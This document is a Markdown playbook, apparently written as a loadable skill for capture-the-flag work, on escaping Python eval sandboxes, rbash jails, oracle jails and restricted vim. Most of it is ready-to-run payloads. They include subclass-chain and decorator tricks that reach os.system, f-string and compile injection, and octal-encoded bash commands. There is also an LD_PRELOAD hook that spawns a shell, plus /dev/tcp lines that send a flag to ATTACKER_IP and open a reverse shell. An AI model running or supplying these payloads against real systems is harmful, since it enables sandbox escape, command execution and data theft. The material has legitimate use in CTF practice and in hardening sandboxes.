# Sandbox and Jail Escape

## Trigger
Load when facing a restricted Python environment (eval/exec sandbox), a bash restricted shell (rbash), a jail with character/command whitelisting, an oracle-based secret extraction challenge, or any sandbox that filters input or blocks imports. Also use for vim/restricted-editor escapes.

## Attack Surface
Target characteristics: Python eval/exec sandboxes with filtered builtins, restricted AST nodes, or banned keywords; bash/rbash jails with limited command sets and character whitelists; oracle-based jails with `L()`, `Q(i,x)`, `S(guess)` patterns; mastermind-style challenge games; environments with blocked file read utilities but available bash; vim with `:!` blocked but `K` (keywordprg) available.

## Decision Tree
1. For Python jails: determine if it is eval() or exec(), and whether the filtering is AST-based or string-based.
2. Test basic features: arithmetic, string literals, booleans, function calls to map the allowed set.
3. Test blocked AST nodes: concat, indexing, attribute access, lists, lambdas.
4. For char-restricted jails: use Unicode homoglyphs, octal escapes, or `dir()`-indexed attribute access.
5. For bash jails: test for `$#`, `${##}`, `$'...'` octal, HISTFILE tricks.
6. For oracle jails: determine query functions and implement binary search.
7. If no direct escape, try multi-stage payload with class attribute persistence.

## Techniques

### Python Jail Identification
```
Error pattern           Meaning                        Approach
"name not allowed: X"   Identifier blacklist           Unicode/hex escapes
"unknown function: X"   Function whitelist             Brute-force function names
"node not allowed: X"   AST filtering                  Avoid blocked syntax
"binop must be int/bool" Type restrictions             Use int operations only
```

### Python Classic Escape via Class Hierarchy
```python
# Find index of catch_warnings or os._wrap_close
subs = ''.__class__.__mro__[1].__subclasses__()
for i, cls in enumerate(subs):
    print(i, cls.__name__)

# Index varies by Python version (49/59/62 in 3.8/3.10/3.11+); enumerate at runtime
# Access os via warnings -> linecache chain
().__class__.__base__.__subclasses__()[59] \
    .__init__.__globals__["linecache"] \
    .__dict__["os"].system("id")
```

### Python dir() Attribute Lookup (Bypassing String Filters)
```python
# When "__class__", "__subclasses__" etc. are filtered as strings:
# Use dir() which returns attribute names at runtime

i_class = 1       # index of "__class__" in dir([])
i_subclasses = 34 # varies by Python version

cls  = getattr([], dir([])[i_class])                          # list.__class__
base = getattr(cls, dir(cls)[dir(cls).index("__base__")])     # object
subs = getattr(base, dir(base)[i_subclasses])()               # all subclasses

# Find subprocess.Popen
for klass in subs:
    if "Popen" in getattr(klass, dir(klass)[dir(klass).index("__name__")]):
        break
klass(["/bin/sh", "-c", "cat flag"])
```

### Python Decorator Escape (No ast.Call, No Quotes, No Equals)
```python
# When ast.Call is banned but decorators (ast.FunctionDef) are allowed:
# @expr compiles to name = expr(func) without ast.Call node

def __builtins__(): pass
def __name__(): pass
def __import__(): pass

# Step 1: Extract real __import__ from loader's globals
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__(): pass

# Step 2: Import os module
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os(): pass

# Step 3: Run shell command
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh(): pass
```

### Python Restricted Charset Number Generation
```python
def brainfuckize(nb):
    """Generate any integer using only ~, <<, [], {} and <.
    []<[] = False = 0, {}<[] = True = 1"""
    if nb == -2: return "~({}<[])"
    if nb == -1: return "~([]<[])"
    if nb == 0:  return "([]<[])"
    if nb == 1:  return "({}<[])"
    if nb % 2:   return f"~{brainfuckize(~nb)}"
    return f"({brainfuckize(nb//2)}<<({{}}<[]))"

# Build strings: "%c" % 65 -> "A"
"".__class__.__mro__[1].__subclasses__()  # etc.
```

### Python Walrus Operator Reassignment
```python
# When constraint variables limit character set
(abcdef := "all_allowed_characters_here")
print(open("/demo/flag.txt").read())
```

### Python Quine + Context Detection
```python
# Server asks for a quine, then exec()s it with different globals
# Gate payload on globals difference:
s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/demo/flag.txt")if"subprocess"in globals()else 0'
print(s%s,end="");__import__("os").system("cat /app/demo/flag.txt")if"subprocess"in globals()else 0
```

### Python Oracle-Based Extraction
```python
# Common oracles: L() = length, Q(i,x) = compare, S(guess) = submit

def binary_search_flag():
    flag_len = int(test("L()"))
    flag = ""
    for i in range(flag_len):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            cmp = test(f"Q({i},{mid})")
            if cmp == 0:
                flag += chr(mid)
                break
            elif cmp == -1:  # mid < flag[i]
                lo = mid + 1
            else:
                hi = mid - 1
        else:
            flag += chr(lo)
    return flag
```

### Python f-string Config Injection
```python
# When config values are rendered in f-strings:
# Step 1: Store payload
register_key("a", '__import__("os").system("cat flag.txt")')
# Step 2: Create key whose name is eval(a)
register_key("eval(a)", "{}")
# Step 3: f-string evaluates eval(a) when config is displayed
show_config()  # triggers RCE
```

### Python Compile/Magic Comment Bypass
```python
# Compile bypass
exec(compile('__import__("os").system("sh")', '', 'exec'))

# Magic comment Unicode escape bypass
# -*- coding: raw_unicode_escape -*-
import os

# Alternative encodings: utf-7, rot_13
```

### Bash Jail Escape via $0 Expansion
```bash
# When only #, $, \ are allowed (HashCashSlash):
# Payload: \$$#
# In double-quoted eval context:
# \$ -> literal $, $# -> 0, combined -> $0 -> bash
# Result: spawns interactive shell
```

### Bash Character-Restricted Tricks
```bash
# ANSI-C quoting with octal (when letters are banned)
__=$'\057\147\145\164\137\146\154\147'  # /get_flag in octal
$__  # executes /get_flag

# Build numbers without digits
# $# = 0, ${##} = 1 (length of "0")
# $$ = PID (multi-digit number)

# Environment variable substring extraction
# ${OSTYPE:6:1} = first char from position 6 of OSTYPE
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
```

### HISTFILE Trick for File Reads
```bash
# Method 1: Load file as bash history
HISTFILE=/demo/flag /bin/bash
history

# Method 2: Verbose mode
bash -v /demo/flag.txt

# Method 3: ctypes.sh direct C library calls
dlcall -n fd open /demo/flag 0
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

### LD_PRELOAD Hook via Allowed Commands
```c
// hook.c -- hijacks any libc-linked binary
#include <stdlib.h>
__attribute__((constructor))
void init(void) { system("/bin/bash -p -c 'cat /demo/flag'"); }
```

```bash
gcc -shared -fPIC hook.c -o /tmp/hook.so
# Then prefix any allowed binary
LD_PRELOAD=/tmp/hook.so cat
```

### /dev/tcp Exfiltration (No netcat needed)
```bash
# Bash built-in TCP -- works even without netcat/curl
cat /demo/flag > /dev/tcp/ATTACKER_IP/8081

# Bidirectional shell
exec 3<>/dev/tcp/ATTACKER_IP/8081
cat <&3 | /bin/sh >&3 2>&3
```

### Closed-Stdout Jail Bypass
```bash
# If stdout is closed, redirect to stdin (fd 0 = socket)
cat /demo/flag 1>&0

# For files with \r carriage returns, use cat -A
cat -A /demo/flag 1>&0  # CR shows as ^M
# Alternatives: od -c flag, xxd flag, base64 flag

# Reopen stdout
exec 1>/dev/tty   # if tty is attached
exec 1>&0         # duplicate socket fd onto stdout
```

### Restricted vim Escape via K (keywordprg)
```text
vim file.txt        # restricted vim opens
(cursor on any word)
K                   # runs `man <word>` -> pager `less`
!sh                 # less shell-escape -> real shell
```

## Bypass
- If `__builtins__` is empty but `__loader__` exists, use `__loader__.load_module.__func__.__globals__["__builtins__"]` to recover real builtins.
- If `__loader__` is also gone, use any available function's `__globals__` to find module references.
- If `exec`/`eval` are banned, use `compile()` + exec or `__import__` directly.
- If alpha chars are banned, use `dir()` indexed access (returns strings at runtime, bypassing static filters).
- For bash with `{` and `}` blocked, use `$'...'` ANSI-C quoting with octal escapes.
- If `cat`/`less`/`head` are all blocked in bash, use HISTFILE, `bash -v`, or `/dev/tcp` redirection.

## Verification
- Python `__subclasses__()` traversal finds `os._wrap_close` or `subprocess.Popen` and executes a command.
- Bash `$0` expansion spawns an interactive shell (confirmed by `exit` working).
- Oracle binary search retrieves the complete flag character by character.
- Decorator-based escape produces a shell without triggering `ast.Call` blocks.
- HISTFILE method displays file contents via `history` command.

## Pitfalls
- Class index in `__subclasses__()` varies by Python version and loaded modules -- always enumerate first.
- `dir()` index positions for `__base__` and `__subclasses__` also vary; find them dynamically.
- Oracle functions have response latency -- ensure adequate timeout in automated extraction.
- In decorator chains, `__name__` must be defined as a function BEFORE it is referenced as a string.
- `LD_PRELOAD` only works on dynamically linked binaries and requires a writable filesystem.
- `/dev/tcp` is a bash built-in feature, not a real device; it may be compiled out in minimal shells.
- `HISTFILE` trick loads the file as commands; lines starting with `#` (comments) are safe but actual commands may execute.
